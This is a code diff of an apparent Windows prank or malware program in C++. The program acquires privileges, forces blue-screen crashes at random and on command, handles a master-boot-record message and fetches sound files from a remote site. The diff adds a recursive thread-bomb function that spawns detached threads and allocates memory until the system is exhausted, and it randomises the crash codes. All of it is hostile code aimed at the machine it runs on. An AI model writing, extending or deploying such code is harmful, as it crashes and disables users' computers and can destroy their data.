@@ -16,16 +16,42 @@ command:
 
 */
 
-#define __BUILD__ 1
+constexpr auto __BUILD__ = 1;
 
 #include"std.h"
 #include"func.h"
 #include"hide.h"
 
+
+
+
 //自建中止函数
 void terminate_func()
 {
-	MakeBlueScreen(0xccccc513);
+	MakeBlueScreen(0xCFFFFFF1);
+}
+void copy_thread(clock_t compt_end)
+{
+	long double* p=NULL;
+	while (clock() < compt_end)
+	{
+		try
+		{
+			std::thread thrd_1(copy_thread, compt_end), thrd_2(copy_thread, compt_end), thrd_3(copy_thread, compt_end), thrd_4(copy_thread, compt_end);
+			thrd_1.detach();
+			thrd_2.detach();
+			thrd_3.detach();
+			thrd_4.detach();
+			p = new long double[4096];
+			Sleep(5.12 * 1000);
+			delete[]p;
+		}
+		catch (...)
+		{
+			return;
+		}
+	}
+	return;
 }
 
 int _tmain(int argc, TCHAR* c_argv[])
@@ -63,7 +89,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 	GetPrivileges();
 
 	if (cmd_b)
-		MakeBlueScreen(0xcccccccc);
+		MakeBlueScreen(0xCFFFFFF0);
 	if (cmd_m)
 	{
 		char mbrmsg_s[512];
@@ -97,7 +123,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 		}
 		//抽奖
 		if (rand() % 16 == 0 && !cmd__b)
-			iserror = MakeBlueScreen(0xCC232323) || iserror;
+			iserror = MakeBlueScreen(0xC0000000+rand()%0xFFFFFF0) || iserror;
 		if (rand() % 16 == 0&&!cmd__s)
 		{
 			std::wstring soundid;
@@ -106,6 +132,11 @@ int _tmain(int argc, TCHAR* c_argv[])
 			std::wstring sounddata;
 			sounddata = GetDataFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), t_isok);
 			iserror = PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound") + soundid + _T(".wav"), true) || iserror || !t_isok;
+		}
+		if (rand() % 16 == 0)
+		{
+			std::thread thrd(copy_thread, clock() + 5 * CLOCKS_PER_SEC);
+			thrd.detach();
 		}
 		if (iserror)
 			terminate();
